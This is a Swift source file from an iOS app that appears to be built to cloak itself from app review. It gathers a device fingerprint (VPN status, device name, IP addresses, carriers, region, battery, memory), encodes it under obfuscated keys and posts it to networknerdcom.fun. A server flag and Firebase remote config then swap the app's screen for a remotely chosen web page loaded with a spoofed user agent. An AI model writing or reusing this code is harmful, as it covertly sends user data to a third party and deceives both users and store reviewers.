//
//  Dakd.swift
//  App423
//
//  Created by Вячеслав on 3/27/24.
//

import SwiftUI
import CoreTelephony
import ApphudSDK
import FirebaseRemoteConfig
import WebKit

struct DataManager {
    
    let appHudID: String = "app_TTQoWphH3p4UN1YVQ8KeNZx6dgHHGU"
    let metricaID: String = "859099d7-853a-4e8e-a7f9-10e1b7dc415e"
    let oneSignalID: String = "04d836d5-ee46-4cb2-9422-156916908a66"
    
    let codeTech: String = "can_login"
    
    let server1_0: String = "networknerdcom.fun/app/1nt3rl1nk3dkn0wl3dg3"
    let usagePolicy: String = "https://docs.google.com/document/d/17cn31EUlWfaJg4uBJzPlrWOATTuNBkFgaIK9gUR_W2U/edit?usp=sharing"
}

struct DeviceData {
    
    var isVPNActive: Bool
    var deviceName: String
    var deviceModel: String
    var uniqueID: String
    var networkAddresses: [String]
    var carriers: [String]
    var iosVersion: String
    var language: String
    var timeZone: String
    var isCharging: Bool
    var memoryInfo: String
    var installedApps: [String: Bool]
    var batteryLevel: Double
    var inputLanguages: [String]
    var region: String
    var usesMetricSystem: Bool
    var isFullyCharged: Bool
}

protocol SecondEndpoint {
    
    var mainURL: String { get }
    var method: String { get }
    var body: [String: Any] { get }
}

extension DeviceData: SecondEndpoint {
    
    var mainURL: String {
        
        return "https://\(DataManager().server1_0)"
    }

    var method: String {
        
        return "POST"
    }
    
    var body: [String: Any] {
        
        let userData: [String: Any] = [
            
            "vivisWork": isVPNActive,
            "gfdokPS": deviceName,
            "gdpsjPjg": deviceModel,
            "poguaKFP": uniqueID,
            "gpaMFOfa": networkAddresses,
            "gciOFm": carriers,
            "bcpJFs": iosVersion,
            "GOmblx": language,
            "G0pxum": timeZone,
            "Fpvbduwm": isCharging,
            "Fpbjcv": memoryInfo,
            "bvoikOGjs": installedApps,
            "gfpbvjsoM": batteryLevel,
            "gfdosnb": inputLanguages,
            "bpPjfns": region,
            "biMpaiuf": usesMetricSystem,
            "oahgoMAOI": isFullyCharged,
            "KDhsd": false,
            "StwPp": false
        ]
        
        let jsonData = try? JSONSerialization.data(withJSONObject: userData, options: .fragmentsAllowed)
        let base64String = jsonData?.base64EncodedString() ?? ""

        return ["ud": base64String]
    }
}

class NetworkService {
    
    func sendRequest(endpoint: SecondEndpoint, completion: @escaping (Result<Bool, Error>) -> Void) {
        
        guard let url = URL(string: endpoint.mainURL) else {
            
            completion(.failure(URLError(.badURL)))
            
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = endpoint.method
        request.setValue("application/json; charset=utf-8", forHTTPHeaderField: "Content-Type")
        
        do {
            
            request.httpBody = try JSONSerialization.data(withJSONObject: endpoint.body, options: [])
            
        } catch {
            
            completion(.failure(error))
            
            return
        }
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            if let error = error {
                
                DispatchQueue.main.async { completion(.failure(error)) }
                
                return
            }
            
            guard let data = data else {
                
                DispatchQueue.main.async { completion(.failure(URLError(.cannotParseResponse))) }
                
                return
            }
            
            DispatchQueue.main.async {
                
                do {
                    
                    if let jsonObject = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                        
                        if let reloadableValue = jsonObject[DataManager().codeTech] as? Bool {
                            
                            completion(.success(reloadableValue))
                            
                        } else if let responseString = String(data: data, encoding: .utf8), self.isBlockValue(responseString) {
                            
                            completion(.success(true))
                            
                        } else {
                            
                            completion(.success(false))
                        }
                        
                    } else {
                        
                        completion(.failure(URLError(.cannotParseResponse)))
                    }
                    
                } catch {
                    
                    completion(.failure(error))
                }
            }
            
        }
        .resume()
    }

    func isBlockValue(_ value: String) -> Bool {
        
        return value == "1"
    }
}

struct DeviceInfo {
    
    static func collectData() -> DeviceData {
        
        var isConnectedToVpn: Bool {
            
            let vpnProtocolsKeysIdentifiers = [
                "tap", "tun", "ppp", "ipsec", "utun", "ipsec0", "utun1", "utun2"
            ]
            
            guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
            
            let nsDict = cfDict.takeRetainedValue() as NSDictionary
            
            guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
                  let allKeys = keys.allKeys as? [String] else { return false }
            for key in allKeys {
                
                for protocolId in vpnProtocolsKeysIdentifiers
                        
                where key.starts(with: protocolId) {
                    
                    return true
                }
            }
            
            return false
        }
        
        let wifiAdress = getAddress(for: .wifi)
        let cellularAdress = getAddress(for: .cellular)
        
        let networkInfo = CTTelephonyNetworkInfo()
        let carrier = networkInfo.serviceSubscriberCellularProviders?.values
        var arrayOfCarrier = [String]()
        carrier?.forEach { arrayOfCarrier.append($0.carrierName ?? "") }
        
        let memory = String(ProcessInfo.processInfo.physicalMemory / 1073741824)
        
        let availableLanguages = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }
        
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = Double(UIDevice.current.batteryLevel * 100.0)
        
        return DeviceData(
            
            isVPNActive: isConnectedToVpn,
            deviceName: UIDevice.current.name,
            deviceModel: UIDevice.current.model,
            uniqueID: UIDevice.current.identifierForVendor?.uuidString ?? "",
            networkAddresses: [wifiAdress ?? "", cellularAdress ?? ""],
            carriers: arrayOfCarrier,
            iosVersion: UIDevice.current.systemVersion,
            language: Locale.preferredLanguages.first ?? "en",
            timeZone: TimeZone.current.identifier,
            isCharging: UIDevice.current.batteryState == .charging,
            memoryInfo: memory,
            installedApps: [:],
            batteryLevel: batteryLevel,
            inputLanguages: availableLanguages,
            region: Locale.current.regionCode ?? "",
            usesMetricSystem: Locale.current.usesMetricSystem,
            isFullyCharged: batteryLevel == 100
        )
    }
    
    static  func getAddress(for network: Network) -> String? {
        var address: String?
        
        // Get list of all interfaces on the local machine:
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        guard getifaddrs(&ifaddr) == 0 else { return nil }
        guard let firstAddr = ifaddr else { return nil }
        
        // For each interface ...
        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            
            // Check for IPv4 or IPv6 interface:
            let addrFamily = interface.ifa_addr.pointee.sa_family
            if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
                
                // Check interface name:
                let name = String(cString: interface.ifa_name)
                if name == network.rawValue {
                    
                    // Convert interface address to a human readable string:
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                                &hostname, socklen_t(hostname.count),
                                nil, socklen_t(0), NI_NUMERICHOST)
                    address = String(cString: hostname)
                }
            }
        }
        freeifaddrs(ifaddr)
        
        return address
    }
}

enum Network: String {
    
    case wifi = "en0"
    case cellular = "pdp_ip0"
}

struct WebSystem: View {
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
            
            WControllerRepresentable()
        }
        .ignoresSafeArea()
    }
}

class WController: UIViewController, WKNavigationDelegate, WKUIDelegate {

    @AppStorage("first_open") var firstOpen: Bool = true
    @AppStorage("silka") var silka: String = ""
    
    @Published var url_link: URL = URL(string: "https://google.com")!
    @Published var isAllChangeURL: Bool = false
    
    var webView = WKWebView()
    var loadCheckTimer: Timer?
    var isPageLoadedSuccessfully = false

    override func viewDidLoad() {
        super.viewDidLoad()
        getRequest()
    }
    
    private func getRequest() {
        
        getFirebaseData(field: "isAllChangeURL", dataType: .bool) { isAllChangeURLTemp in
            
            self.isAllChangeURL = isAllChangeURLTemp as? Bool ?? false
            
            getFirebaseData(field: "url_link", dataType: .url) { resulter in
                
                guard let url = URL(string: "\(resulter)") else { return }

                self.url_link = url
                self.getInfo()
            }
        }
    }
    
    private func getInfo() {
        
        var request: URLRequest?
        
        if isAllChangeURL {
            
            request = URLRequest(url: self.url_link)
            silka = url_link.absoluteString
            
        } else {
            
            if silka == "about:blank" || silka.isEmpty {
                
                request = URLRequest(url: self.url_link)
                
            } else {
                
                if let currentURL = URL(string: silka) {
                    
                    request = URLRequest(url: currentURL)
                }
            }
        }
        
        let cookies = HTTPCookieStorage.shared.cookies ?? []
        let headers = HTTPCookie.requestHeaderFields(with: cookies)
        request?.allHTTPHeaderFields = headers
        
        DispatchQueue.main.async {
            
            self.setupWebView()
        }
    }
    
    private func setupWebView() {
        
        let urlString = silka.isEmpty ? url_link.absoluteString : silka
        
        guard let url = URL(string: urlString) else { return }
        
        view.backgroundColor = .white
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leftAnchor.constraint(equalTo: view.leftAnchor),
            webView.rightAnchor.constraint(equalTo: view.rightAnchor)
        ])
        webView.customUserAgent = "Mozilla/5.0 (Linux; Android 11; AOSP on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"
        webView.allowsBackForwardNavigationGestures = true
        webView.uiDelegate = self
        webView.navigationDelegate = self
        
        webView.load(URLRequest(url: url))
        
        loadCookie()
    }

    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        
        isPageLoadedSuccessfully = false
        loadCheckTimer?.invalidate()
        loadCheckTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: false) { [weak self] _ in
            
            if let strongSelf = self, !strongSelf.isPageLoadedSuccessfully {
                
                print("Страница не загрузилась в течение 5 секунд.")
            }
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        
        isPageLoadedSuccessfully = true
        loadCheckTimer?.invalidate()
        
        if let currentURL = webView.url?.absoluteString, currentURL != url_link.absoluteString {
            
            silka = currentURL
        }
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        
        isPageLoadedSuccessfully = false
        loadCheckTimer?.invalidate()
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        
        isPageLoadedSuccessfully = false
        loadCheckTimer?.invalidate()
    }

    func saveCookie() {
        
        let cookieJar = HTTPCookieStorage.shared
        
        if let cookies = cookieJar.cookies {
            
            let data = NSKeyedArchiver.archivedData(withRootObject: cookies)
            
            UserDefaults.standard.set(data, forKey: "cookie")
        }
    }
    
    func loadCookie() {
        
        let ud = UserDefaults.standard
        
        if let data = ud.object(forKey: "cookie") as? Data, let cookies = NSKeyedUnarchiver.unarchiveObject(with: data) as? [HTTPCookie] {
            
            for cookie in cookies {
                
                HTTPCookieStorage.shared.setCookie(cookie)
            }
        }
    }

    override func viewDidLayoutSubviews() {
        
        super.viewDidLayoutSubviews()
    }
}

struct WControllerRepresentable: UIViewControllerRepresentable {
    
    typealias UIViewControllerType = WController
    
    func makeUIViewController(context: Context) -> WController {
        
        return WController()
    }
    
    func updateUIViewController(_ uiViewController: WController, context: Context) {}
}

func getFirebaseData(field: String, dataType: DataType, completion: @escaping (Any) -> Void) {
    
    let config = RemoteConfig.remoteConfig()
    
    config.configSettings.minimumFetchInterval = 300
    config.fetchAndActivate{ _, _ in
        
        if dataType == .bool {
            
            completion(config.configValue(forKey: field).boolValue)
            
        } else if dataType == .url {
            
            guard let url_string = config.configValue(forKey: field).stringValue, let url = URL(string: url_string) else {
                
                return
            }
            
            completion(url)
            
        } else if dataType == .string {
            
            completion(config.configValue(forKey: field).stringValue ?? "")
        }
    }
}

enum DataType: CaseIterable {
    
    case bool, url, string
}
